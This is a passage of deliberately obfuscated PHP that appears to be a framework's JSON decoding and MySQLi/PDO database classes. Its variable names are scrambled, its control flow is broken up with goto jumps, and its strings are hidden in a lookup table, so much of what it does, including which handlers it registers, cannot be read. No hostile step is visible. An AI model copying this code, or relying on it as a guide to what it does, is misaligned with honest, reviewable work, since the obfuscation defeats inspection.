array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Dœ×Í—òˆ, array($Aéè¨İçíÓ[1972] => SERVICES_JSON_IN_CMT, $Aéè¨İçíÓ[267] => $B÷­Ì®‘‡, $Aéè¨İçíÓ[1973] => !1)); $B÷­Ì®‘‡++; } elseif ($dÁÇáÖ„ìÀ == $Aéè¨İçíÓ[1977] && $c«ÎÌ …ñâ[$Aéè¨İçíÓ[1972]] == SERVICES_JSON_IN_CMT) { array_pop($Dœ×Í—òˆ); $B÷­Ì®‘‡++; for ($A¼¬¬ï„¾© = $c«ÎÌ …ñâ[$Aéè¨İçíÓ[267]]; $A¼¬¬ï„¾© <= $B÷­Ì®‘‡; ++$A¼¬¬ï„¾©) { $dœÚÏÜš–— = substr_replace($dœÚÏÜš–—, $Aéè¨İçíÓ[50], $A¼¬¬ï„¾©, 1); } } } if (reset($Dœ×Í—òˆ) == SERVICES_JSON_IN_ARR) { return $cô¿’Ğ’ßï; } elseif (reset($Dœ×Í—òˆ) == SERVICES_JSON_IN_OBJ) { return $f¢Ÿ¾ÃŒø‹; } goto dšÎ“¬¹Ñ«; A™‘äÄğÔ: if ($AÏŒÌÎ×Ä[0] == $Aéè¨İçíÓ[157]) { $Dœ×Í—òˆ = array(SERVICES_JSON_IN_ARR); $cô¿’Ğ’ßï = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Dœ×Í—òˆ = array(SERVICES_JSON_IN_OBJ); $f¢Ÿ¾ÃŒø‹ = array(); } else { $Dœ×Í—òˆ = array(SERVICES_JSON_IN_OBJ); $f¢Ÿ¾ÃŒø‹ = new stdClass(); } } array_push($Dœ×Í—òˆ, array($Aéè¨İçíÓ[1972] => SERVICES_JSON_SLICE, $Aéè¨İçíÓ[267] => 0, $Aéè¨İçíÓ[1973] => !1)); $dœÚÏÜš–— = substr($AÏŒÌÎ×Ä, 1, -1); goto bï ˆõ½˜; dšÎ“¬¹Ñ«: } } } function isError($f¬óìÂä¨, $dèäÁ÷™ìù = null) { $e‚™»Ìá†‘ =& $_SERVER[…Ò×–]; if (class_exists($e‚™»Ìá†‘[1978])) { return PEAR::isError($f¬óìÂä¨, $dèäÁ÷™ìù); } elseif (is_object($f¬óìÂä¨) && (get_class($f¬óìÂä¨) == $e‚™»Ìá†‘[1979] || is_subclass_of($f¬óìÂä¨, $e‚™»Ìá†‘[1979]))) { return !0; } return !1; } } goto eò…›¿µ; A•›ÏŒíî¯: register_shutdown_function($_SERVER[ä¡—±€µó–è][32]); set_error_handler($_SERVER[ä¡—±€µó–è][46], $A‰œµ§ùÒ); if (function_exists($_SERVER[ä¡—±€µó–è][47])) { set_exception_handler($_SERVER[ä¡—±€µó–è][48]); } goto f…„º†Ïäç; DÃˆÃ¹š§£: class DbMysqli extends Db { public function __construct($aÍ‰­Í¢ = '') { $C±ïä¥Îøº =& $_SERVER[…Ò×–]; if (!extension_loaded($C±ïä¥Îøº[731])) { think_exception(think_lang($C±ïä¥Îøº[10]) . $C±ïä¥Îøº[834]); } if (!empty($aÍ‰­Í¢)) { $this->config = $aÍ‰­Í¢; if (empty($this->config[$C±ïä¥Îøº[13]])) { $this->config[$C±ïä¥Îøº[13]] = $C±ïä¥Îøº[33]; } } } public function connect($Cáß¹¥Ê© = '', $Bñï¨Ş¾ÑÒ = 0) { $B×„åÁ¢Š¸ =& $_SERVER[…Ò×–]; if (!isset($this->linkID[$Bñï¨Ş¾ÑÒ])) { goto C´‰Ş²ª¢Ë; dÁ ëÇóŠ: $bæ˜Âîâ½§ = $this->linkID[$Bñï¨Ş¾ÑÒ]->server_version; $this->linkID[$Bñï¨Ş¾ÑÒ]->query($B×„åÁ¢Š¸[812] . think_config($B×„åÁ¢Š¸[813]) . $B×„åÁ¢Š¸[55]); if ($bæ˜Âîâ½§ > $B×„åÁ¢Š¸[814]) { $this->linkID[$Bñï¨Ş¾ÑÒ]->query($B×„åÁ¢Š¸[815]); } goto cËğ·¸Ÿš§; cËğ·¸Ÿš§: $this->connected = !0; if (1 != think_config($B×„åÁ¢Š¸[18])) { unset($this->config); } goto a©ŠóŒŞ±; C´‰Ş²ª¢Ë: if (empty($Cáß¹¥Ê©)) { $Cáß¹¥Ê© = $this->config; } $this->linkID[$Bñï¨Ş¾ÑÒ] = new mysqli($Cáß¹¥Ê©[$B×„åÁ¢Š¸[808]], $Cáß¹¥Ê©[$B×„åÁ¢Š¸[810]], $Cáß¹¥Ê©[$B×„åÁ¢Š¸[811]], $Cáß¹¥Ê©[$B×„åÁ¢Š¸[17]], $Cáß¹¥Ê©[$B×„åÁ¢Š¸[809]] ? intval($Cáß¹¥Ê©[$B×„åÁ¢Š¸[809]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dÁ ëÇóŠ; a©ŠóŒŞ±: } return $this->linkID[$Bñï¨Ş¾ÑÒ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a°ÏŠ½âÃÈ) { goto F¼©àƒëĞ±; F¼©àƒëĞ±: $C²èğ½‹· =& $_SERVER[…Ò×–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fé“Çî¤ùƒ; EÒ×áÄîƒÙ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto E¥éì¶ÅÕ¿; aã»µ‹Ûå‘: think_status($C²èğ½‹·[20]); $this->queryID = $this->_linkID->query($a°ÏŠ½âÃÈ); if ($this->_linkID->more_results()) { while (($C»ìÕœ¯Á = $this->_linkID->next_result()) != NULL) { $C»ìÕœ¯Á->free_result(); } } goto EÒ×áÄîƒÙ; Fé“Çî¤ùƒ: $this->queryStr = $a°ÏŠ½âÃÈ; if ($this->queryID) { $this->free(); } think_action_status($C²èğ½‹·[19], 1); goto aã»µ‹Ûå‘; E¥éì¶ÅÕ¿: } public function execute($b„ªº•ãé±) { goto EßÛĞ®ğÙ; cÔ¨²µ˜øö: if (!1 === $dø»¡°¬†ç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto bè­†¦áª¤; EßÛĞ®ğÙ: $Eõ¢ñÔßƒñ =& $_SERVER[…Ò×–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EçªŒï; EçªŒï: $this->queryStr = $b„ªº•ãé±; if ($this->queryID) { $this->free(); } think_action_status($Eõ¢ñÔßƒñ[21], 1); goto d‡ù†­×—‚; d‡ù†­×—‚: think_status($Eõ¢ñÔßƒñ[20]); $dø»¡°¬†ç = $this->_linkID->query($b„ªº•ãé±); $this->debug(); goto cÔ¨²µ˜øö; bè­†¦áª¤: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c³²’ó”‚¥ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$c³²’ó”‚¥) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a¨Íà¤¤“ğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a¨Íà¤¤“ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $b‚¥¯óÁá° = array(); if ($this->numRows > 0) { for ($f‘®Š³ø¨ = 0; $f‘®Š³ø¨ < $this->numRows; $f‘®Š³ø¨++) { $b‚¥¯óÁá°[$f‘®Š³ø¨] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $b‚¥¯óÁá°; } public function getFields($b¬ù¾¥¹…Ï) { $EêÃï—¯Çî =& $_SERVER[…Ò×–]; $dóàœğ®²˜ = $this->query($EêÃï—¯Çî[819] . $this->parseKey($b¬ù¾¥¹…Ï)); $B‰Ïãº­ùò = array(); if ($dóàœğ®²˜) { foreach ($dóàœğ®²˜ as $dÊØîöë§è => $F¹˜­ØÆ†) { $B‰Ïãº­ùò[$F¹˜­ØÆ†[$EêÃï—¯Çî[27]]] = array($EêÃï—¯Çî[28] => $F¹˜­ØÆ†[$EêÃï—¯Çî[27]], $EêÃï—¯Çî[29] => $F¹˜­ØÆ†[$EêÃï—¯Çî[30]], $EêÃï—¯Çî[31] => (bool) ($F¹˜­ØÆ†[$EêÃï—¯Çî[32]] === $EêÃï—¯Çî[33]), $EêÃï—¯Çî[34] => $F¹˜­ØÆ†[$EêÃï—¯Çî[35]], $EêÃï—¯Çî[36] => strtolower($F¹˜­ØÆ†[$EêÃï—¯Çî[37]]) == $EêÃï—¯Çî[38], $EêÃï—¯Çî[39] => strtolower($F¹˜­ØÆ†[$EêÃï—¯Çî[40]]) == $EêÃï—¯Çî[41]); } } return $B‰Ïãº­ùò; } public function getTables($aŠŞ¯‘ÅÁ¡ = '') { $fòõŸïÄŸ =& $_SERVER[…Ò×–]; $a’¤¡­éåœ = !empty($aŠŞ¯‘ÅÁ¡) ? $fòõŸïÄŸ[821] . $aŠŞ¯‘ÅÁ¡ : $fòõŸïÄŸ[822]; $fğˆÔœ…Ê = $this->query($a’¤¡­éåœ); $B“Ì­ÛÂ½ù = array(); if ($fğˆÔœ…Ê) { foreach ($fğˆÔœ…Ê as $e¹ôÅ½šÓØ => $f‘Ïˆ…) { $B“Ì­ÛÂ½ù[$e¹ôÅ½šÓØ] = current($f‘Ïˆ…); } } return $B“Ì­ÛÂ½ù; } public function replace($eÃã‹–íÛÛ, $Dì¾ÈÈÔé = array()) { $cçÄäğµ¯ =& $_SERVER[…Ò×–]; foreach ($eÃã‹–íÛÛ as $fİ¡ÏÚ‹ôß => $fÛ£“ñáÈ) { $e–ò¬ÕÒ§Ë = $this->parseValue($fÛ£“ñáÈ); if (is_scalar($e–ò¬ÕÒ§Ë)) { $fÓÜ¥›êÍ‰[] = $e–ò¬ÕÒ§Ë; $fï‰ÉˆÃ¸æ[] = $this->parseKey($fİ¡ÏÚ‹ôß); } } $c—ÉÓâÅµ‘ = $cçÄäğµ¯[823] . $this->parseTable($Dì¾ÈÈÔé[$cçÄäğµ¯[271]]) . $cçÄäğµ¯[824] . implode($cçÄäğµ¯[47], $fï‰ÉˆÃ¸æ) . $cçÄäğµ¯[825] . implode($cçÄäğµ¯[47], $fÓÜ¥›êÍ‰) . $cçÄäğµ¯[826]; return $this->execute($c—ÉÓâÅµ‘); } public function insertAll($b‹ëåš­ŞÄ, $Fù¿ã¢‡œÈ = array(), $aÏÚçÖ‡ = false) { goto A“ò°øÄÇ¥; A“ò°øÄÇ¥: $f˜¥ôÍÄ¯œ =& $_SERVER[…Ò×–]; if (!is_array($b‹ëåš­ŞÄ[0])) { return !1; } $EÑä£ê…ğ = array_keys($b‹ëåš­ŞÄ[0]); goto Eä²‹½İ©š; Eä²‹½İ©š: $BŞòÛïùÓ = array(); foreach ($b‹ëåš­ŞÄ as $CŠ¦ê’Úªä) { $B³ï½øÒÅ¡ = array(); foreach ($CŠ¦ê’Úªä as $fÒ†Ù½ÕÉè => $D•¯ÇŠóÉ¯) { $D•¯ÇŠóÉ¯ = $this->parseValue($D•¯ÇŠóÉ¯); if (is_scalar($D•¯ÇŠóÉ¯)) { $B³ï½øÒÅ¡[] = $D•¯ÇŠóÉ¯; } } $BŞòÛïùÓ[] = $f˜¥ôÍÄ¯œ[252] . implode($f˜¥ôÍÄ¯œ[47], $B³ï½øÒÅ¡) . $f˜¥ôÍÄ¯œ[826]; } array_walk($EÑä£ê…ğ, array($this, $f˜¥ôÍÄ¯œ[827])); goto C÷«÷×ø«ˆ; C÷«÷×ø«ˆ: $eŒƒÀ±Œ•ª = ($aÏÚçÖ‡ ? $f˜¥ôÍÄ¯œ[828] : $f˜¥ôÍÄ¯œ[829]) . $f˜¥ôÍÄ¯œ[830] . $this->parseTable($Fù¿ã¢‡œÈ[$f˜¥ôÍÄ¯œ[271]]) . $f˜¥ôÍÄ¯œ[824] . implode($f˜¥ôÍÄ¯œ[47], $EÑä£ê…ğ) . $f˜¥ôÍÄ¯œ[831] . implode($f˜¥ôÍÄ¯œ[47], $BŞòÛïùÓ); return $this->execute($eŒƒÀ±Œ•ª); goto AŠ‡Û”¥ßø; AŠ‡Û”¥ßø: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $dÎ®·ëĞÖî =& $_SERVER[…Ò×–]; $this->error = $this->_linkID->errno . $dÎ®·ëĞÖî[4] . $this->_linkID->error; if ($dÎ®·ëĞÖî[33] != $this->queryStr) { $this->error .= LNG($dÎ®·ëĞÖî[45]) . $this->queryStr; } think_trace($this->error, $dÎ®·ëĞÖî[33], $dÎ®·ëĞÖî[46]); return $this->error; } public function escapeString($cÙñŒİ†¯Ê) { if ($this->_linkID) { return $this->_linkID->real_escape_string($cÙñŒİ†¯Ê); } else { return addslashes($cÙñŒİ†¯Ê); } } public function parseKey(&$AˆÑˆŠ˜¸„, $añáëÀô±Ï = true) { $EÏº‚ŠÓõŸ =& $_SERVER[…Ò×–]; if ($añáëÀô±Ï) { $AˆÑˆŠ˜¸„ = $this->parseKeyCheck($AˆÑˆŠ˜¸„); } if ($AˆÑˆŠ˜¸„ != $EÏº‚ŠÓõŸ[180] && !preg_match($EÏº‚ŠÓõŸ[832], $AˆÑˆŠ˜¸„)) { $AˆÑˆŠ˜¸„ = $EÏº‚ŠÓõŸ[833] . trim($AˆÑˆŠ˜¸„, $EÏº‚ŠÓõŸ[833]) . $EÏº‚ŠÓõŸ[833]; } return $AˆÑˆŠ˜¸„; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F—¢¾ÜºŒÉ = '') { $cÙ«•Å×ö– =& $_SERVER[…Ò×–]; if (!class_exists($cÙ«•Å×ö–[835])) { think_exception(think_lang($cÙ«•Å×ö–[10]) . $cÙ«•Å×ö–[836]); } if (!empty($F—¢¾ÜºŒÉ)) { $this->config = $F—¢¾ÜºŒÉ; if (empty($this->config[$cÙ«•Å×ö–[13]])) { $this->config[$cÙ«•Å×ö–[13]] = array(); } } } public function connect($D²ÎÈæ†ñ = '', $a¡‘Ï—šÙâ = 0) { $b«È”²Ÿõ =& $_SERVER[…Ò×–]; if (!isset($this->linkID[$a¡‘Ï—šÙâ])) { goto AÂ”ˆ«¾Ú; Fº·ŞÒ†: $this->dbType = $this->_getDsnType($D²ÎÈæ†ñ[$b«È”²Ÿõ[837]]); if (in_array($this->dbType, array($b«È”²Ÿõ[838], $b«È”²Ÿõ[839], $b«È”²Ÿõ[840], $b«È”²Ÿõ[841]))) { think_exception($b«È”²Ÿõ[842] . $this->dbType . $b«È”²Ÿõ[843] . $this->dbType . $b«È”²Ÿõ[844]); } if (!$this->linkID[$a¡‘Ï—šÙâ]) { think_exception($b«È”²Ÿõ[845]); } goto c™½Ò¯³Ù­; c™½Ò¯³Ù­: try { $this->linkID[$a¡‘Ï—šÙâ]->exec($b«È”²Ÿõ[846] . think_config($b«È”²Ÿõ[813])); } catch (Exception $BÂ¼´½ßÄ) { } $this->connected = !0; if (1 != think_config($b«È”²Ÿõ[18])) { unset($this->config); } goto aÀ Î†¦¬; AÂ”ˆ«¾Ú: if (empty($D²ÎÈæ†ñ)) { $D²ÎÈæ†ñ = $this->config; } if ($this->pconnect) { $D²ÎÈæ†ñ[$b«È”²Ÿõ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$a¡‘Ï—šÙâ] = new PDO($D²ÎÈæ†ñ[$b«È”²Ÿõ[837]], $D²ÎÈæ†ñ[$b«È”²Ÿõ[810]], $D²ÎÈæ†ñ[$b«È”²Ÿõ[811]], $D²ÎÈæ†ñ[$b«È”²Ÿõ[13]]); } catch (PDOException $BÂ¼´½ßÄ) { think_exception($BÂ¼´½ßÄ->getMessage()); } goto Fº·ŞÒ†; aÀ Î†¦¬: } return $this->linkID[$a¡‘Ï—šÙâ]; } public function free() { $this->PDOStatement = null; } public function query($FëÍÃãº˜, $E‚„¨Âá = array()) { goto EøŞ•® †–; cÛˆÎ°’Ä¾: $this->queryStr = $FëÍÃãº˜; if (!empty($E‚„¨Âá)) { $this->queryStr .= $EÃÏŠ—Í•¦[847] . print_r($E‚„¨Âá, !0) . $EÃÏŠ—Í•¦[848]; } if (!empty($this->PDOStatement)) { $this->free(); } goto A²ÚƒÃÏõ©; A²ÚƒÃÏõ©: think_action_status($EÃÏŠ—Í•¦[19], 1); think_status($EÃÏŠ—Í•¦[20]); $this->PDOStatement = $this->_linkID->prepare($FëÍÃãº˜); goto F¡¥îğö“; bó®ˆ¨Çˆ: if (!1 === $eÕÕİ÷É»†) { $this->error(); return !1; } else { return $this->getAll(); } goto bí—‰†‡ßè; EøŞ•® †–: $EÃÏŠ—Í•¦ =& $_SERVER[…Ò×–]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÛˆÎ°’Ä¾; F¡¥îğö“: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $eÕÕİ÷É»† = $this->PDOStatement->execute($E‚„¨Âá); $this->debug(); goto bó®ˆ¨Çˆ; bí—‰†‡ßè: } public function execute($B…‘Ùñ‹£, $b†§äïÀ³ = array()) { goto CŠ¼èš²¹•; E´œöÉ¹œ—: think_status($aá‡¡ƒŒ»Í[20]); $this->PDOStatement = $this->_linkID->prepare($B…‘Ùñ‹£); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto fŠğÜêÃ™º; fŠğÜêÃ™º: $aŒéã£”‹› = $this->PDOStatement->execute($b†§äïÀ³); $this->debug(); if (!1 === $aŒéã£”‹›) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($AÅÌäí…àù || preg_match($aá‡¡ƒŒ»Í[853], $B…‘Ùñ‹£)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto FÂó¦‰™î¥; DÖ˜„š¼ÜÈ: if ($this->dbType == $aá‡¡ƒŒ»Í[841]) { if (preg_match($aá‡¡ƒŒ»Í[849], $this->queryStr, $Dë³¶ó¸ÏÁ)) { $this->table = think_config($aá‡¡ƒŒ»Í[850]) . str_ireplace(think_config($aá‡¡ƒŒ»Í[851]), $aá‡¡ƒŒ»Í[365], $Dë³¶ó¸ÏÁ[2]); $AÅÌäí…àù = (bool) $this->query($aá‡¡ƒŒ»Í[852] . strtoupper($this->table) . $aá‡¡ƒŒ»Í[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aá‡¡ƒŒ»Í[21], 1); goto E´œöÉ¹œ—; Aôß¾ÏãÑ§: $this->queryStr = $B…‘Ùñ‹£; if (!empty($b†§äïÀ³)) { $this->queryStr .= $aá‡¡ƒŒ»Í[847] . print_r($b†§äïÀ³, !0) . $aá‡¡ƒŒ»Í[848]; } $AÅÌäí…àù = !1; goto DÖ˜„š¼ÜÈ; CŠ¼èš²¹•: $aá‡¡ƒŒ»Í =& $_SERVER[…Ò×–]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aôß¾ÏãÑ§; FÂó¦‰™î¥: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eæ‘×Åà° = $this->_linkID->commit(); $this->transTimes = 0; if (!$Eæ‘×Åà°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÚ ğ£‰ƒš = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aÚ ğ£‰ƒš) { $this->error(); return !1; } } return !0; } private function getAll() { $CŠïİİÕÑĞ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($CŠïİİÕÑĞ); return $CŠïİİÕÑĞ; } public function getFields($dÄªôĞ²Äè) { goto Bùã§õĞŞ; Bùã§õĞŞ: $EªÔ¡Çá­ =& $_SERVER[…Ò×–]; $this->initConnect(!0); if (think_config($EªÔ¡Çá­[854])) { $aÛËŒˆÉ‡ = str_replace($EªÔ¡Çá­[855], $dÄªôĞ²Äè, think_config($EªÔ¡Çá­[854])); } else { switch ($this->dbType) { case $EªÔ¡Çá­[838]: case $EªÔ¡Çá­[856]: $aÛËŒˆÉ‡ = "\123\x45\114\x45\x43\124\x20\40\x20\143\157\154\165\x6d\x6e\137\x6e\x61\155\x65\x20\x61\163\40\47\x4e\x61\x6d\x65\x27\x2c\40\x20\x20\x64\141\x74\141\x5f\x74\171\x70\x65\x20\x61\x73\40\47\124\x79\x70\x65\47\54\x20\40\x20\x63\157\154\165\155\x6e\137\144\145\x66\141\165\x6c\x74\40\x61\x73\40\47\104\145\146\141\x75\154\x74\47\54\x20\40\40\x69\x73\x5f\x6e\165\154\154\141\x62\x6c\145\x20\141\163\x20\47\x4e\165\154\154\x27\xa\x9\11\106\122\x4f\x4d\x9\x69\156\x66\x6f\x72\155\141\x74\151\157\156\x5f\x73\143\x68\x65\155\141\56\x74\x61\142\x6c\x65\x73\x20\101\x53\40\x74\xa\11\11\112\x4f\111\116\x9\151\x6e\146\x6f\x72\x6d\x61\164\x69\157\x6e\x5f\x73\143\x68\x65\155\x61\56\143\157\x6c\165\x6d\156\x73\40\x41\x53\40\143\12\x9\11\117\116\x20\x20\x74\x2e\x74\141\142\x6c\145\x5f\x63\x61\x74\141\x6c\157\x67\x20\75\x20\143\x2e\164\x61\x62\x6c\x65\137\x63\x61\x74\141\x6c\157\x67\12\x9\11\101\x4e\104\x20\x74\x2e\x74\141\142\154\x65\137\x73\143\150\145\x6d\x61\40\75\40\x63\56\164\141\x62\x6c\x65\x5f\163\x63\150\x65\155\x61\12\x9\11\x41\116\104\40\x74\56\164\x61\142\154\145\x5f\156\141\155\145\x20\x3d\x20\143\56\164\x61\142\154\145\x5f\x6e\x61\x6d\145\xa\x9\11\127\110\x45\122\105\x20\40\x20\164\x2e\164\x61\x62\154\x65\137\156\x61\x6d\x65\40\75\x20\47{$dÄªôĞ²Äè}\47"; break; case $EªÔ¡Çá­[857]: $aÛËŒˆÉ‡ = $EªÔ¡Çá­[858] . $dÄªôĞ²Äè . $EªÔ¡Çá­[859]; break; case $EªÔ¡Çá­[839]: case $EªÔ¡Çá­[841]: $aÛËŒˆÉ‡ = $EªÔ¡Çá­[860] . $EªÔ¡Çá­[861] . $EªÔ¡Çá­[862] . strtoupper($dÄªôĞ²Äè) . $EªÔ¡Çá­[863] . strtoupper($dÄªôĞ²Äè) . $EªÔ¡Çá­[864]; break; case $EªÔ¡Çá­[865]: $aÛËŒˆÉ‡ = $EªÔ¡Çá­[866] . $dÄªôĞ²Äè . $EªÔ¡Çá­[867]; break; case $EªÔ¡Çá­[840]: break; case $EªÔ¡Çá­[868]: default: $aÛËŒˆÉ‡ = $EªÔ¡Çá­[869] . ($this->dbType == $EªÔ¡Çá­[868] ? "\x60{$dÄªôĞ²Äè}\140" : $dÄªôĞ²Äè); } } goto BÇÖ¤Åª°; CÍĞ¸Ôº»†: return $CŞ¦¸šë¦; goto A£ÚÑÇ¤ö¯; BÇÖ¤Åª°: $BÅÕÓó‘‘‚ = $this->query($aÛËŒˆÉ‡); $CŞ¦¸šë¦ = array(); if ($BÅÕÓó‘‘‚) { foreach ($BÅÕÓó‘‘‚ as $B“¨İâÕ´¤ => $f‹¼Ô‚ˆƒ¢) { $f‹¼Ô‚ˆƒ¢ = array_change_key_case($f‹¼Ô‚ˆƒ¢); $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[28]] = isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[28]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[28]] : $EªÔ¡Çá­[365]; $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[29]] = isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[29]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[29]] : $EªÔ¡Çá­[365]; $b¼×È÷º½Õ = isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[265]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[265]] : $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[28]]; $CŞ¦¸šë¦[$b¼×È÷º½Õ] = array($EªÔ¡Çá­[28] => $b¼×È÷º½Õ, $EªÔ¡Çá­[29] => $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[29]], $EªÔ¡Çá­[31] => (bool) (isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[99]]) && $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[99]] === $EªÔ¡Çá­[33] || isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[31]]) && $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[31]] === $EªÔ¡Çá­[33]), $EªÔ¡Çá­[34] => isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[34]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[34]] : (isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[53]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[53]] : $EªÔ¡Çá­[365]), $EªÔ¡Çá­[36] => isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[89]]) ? strtolower($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[89]]) == $EªÔ¡Çá­[38] : (isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[54]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[54]] : !1), $EªÔ¡Çá­[39] => isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[870]]) ? strtolower($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[870]]) == $EªÔ¡Çá­[41] : (isset($f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[89]]) ? $f‹¼Ô‚ˆƒ¢[$EªÔ¡Çá­[89]] : !1)); } } goto CÍĞ¸Ôº»†; A£ÚÑÇ¤ö¯: } public function getTables($fÙœò¡î¦ = '') { $C·ÓÁ× =& $_SERVER[…Ò×–]; if (think_config($C·ÓÁ×[871])) { $Aò‘Üù»‰ = str_replace($C·ÓÁ×[872], $fÙœò¡î¦, think_config($C·ÓÁ×[871])); } else { switch ($this->dbType) { case $C·ÓÁ×[839]: case $C·ÓÁ×[841]: $Aò‘Üù»‰ = $C·ÓÁ×[873]; break; case $C·ÓÁ×[838]: case $C·ÓÁ×[856]: $Aò‘Üù»‰ = $C·ÓÁ×[874]; break; case $C·ÓÁ×[865]: $Aò‘Üù»‰ = $C·ÓÁ×[875]; break; case $C·ÓÁ×[840]: think_exception(think_lang($C·ÓÁ×[876]) . $C·ÓÁ×[877]); break; case $C·ÓÁ×[857]: $Aò‘Üù»‰ = $C·ÓÁ×[42] . $C·ÓÁ×[43] . $C·ÓÁ×[44]; break; case $C·ÓÁ×[868]: default: if (!empty($fÙœò¡î¦)) { $Aò‘Üù»‰ = $C·ÓÁ×[821] . $fÙœò¡î¦; } else { $Aò‘Üù»‰ = $C·ÓÁ×[822]; } } } $fÄÆ‹òïøï = $this->query($Aò‘Üù»‰); $aõĞÑğæ²« = array(); foreach ($fÄÆ‹òïøï as $b²õİ°õâÕ => $FˆíÄ¼œá¤) { $aõĞÑğæ²«[$b²õİ°õâÕ] = current($FˆíÄ¼œá¤); } return $aõĞÑğæ²«; } protected function parseLimit($d®«ì¡¸Ãµ) { $A˜Æ‰§æáî =& $_SERVER[…Ò×–]; $F¬„ïŠ¯‰ = $A˜Æ‰§æáî[33]; if (!empty($d®«ì¡¸Ãµ)) { switch ($this->dbType) { case $A˜Æ‰§æáî[865]: case $A˜Æ‰§æáî[857]: $d®«ì¡¸Ãµ = explode($A˜Æ‰§æáî[47], $d®«ì¡¸Ãµ); if (count($d®«ì¡¸Ãµ) > 1) { $F¬„ïŠ¯‰ .= $A˜Æ‰§æáî[48] . $d®«ì¡¸Ãµ[1] . $A˜Æ‰§æáî[49] . $d®«ì¡¸Ãµ[0] . $A˜Æ‰§æáî[50]; } else { $F¬„ïŠ¯‰ .= $A˜Æ‰§æáî[48] . $d®«ì¡¸Ãµ[0] . $A˜Æ‰§æáî[50]; } break; case $A˜Æ‰§æáî[838]: case $A˜Æ‰§æáî[856]: break; case $A˜Æ‰§æáî[840]: break; case $A˜Æ‰§æáî[839]: case $A˜Æ‰§æáî[841]: break; case $A˜Æ‰§æáî[868]: default: $F¬„ïŠ¯‰ .= $A˜Æ‰§æáî[48] . $d®«ì¡¸Ãµ . $A˜Æ‰§æáî[50]; } } return $F¬„ïŠ¯‰; } public function parseKey(&$BæŸŒÀÕŠó, $f…ÔŠ–‘ˆĞ = true) { $A‡Âã¤Ô“ë =& $_SERVER[…Ò×–]; if ($f…ÔŠ–‘ˆĞ) { $BæŸŒÀÕŠó = $this->parseKeyCheck($BæŸŒÀÕŠó); } if ($this->dbType == $A‡Âã¤Ô“ë[868]) { if ($BæŸŒÀÕŠó != $A‡Âã¤Ô“ë[180] && !preg_match($A‡Âã¤Ô“ë[832], $BæŸŒÀÕŠó)) { $BæŸŒÀÕŠó = $A‡Âã¤Ô“ë[833] . trim($BæŸŒÀÕŠó, $A‡Âã¤Ô“ë[833]) . $A‡Âã¤Ô“ë[833]; } return $BæŸŒÀÕŠó; } else { return parent::parseKey($BæŸŒÀÕŠó); } } public function close() { $this->_linkID = null; } public function error() { $A¡øÅÂÁ„‡ =& $_SERVER[…Ò×–]; if ($this->PDOStatement) { $aƒ³—Ñ‹äŒ = $this->PDOStatement->errorInfo(); $this->error = $aƒ³—Ñ‹äŒ[1] . $A¡øÅÂÁ„‡[4] . 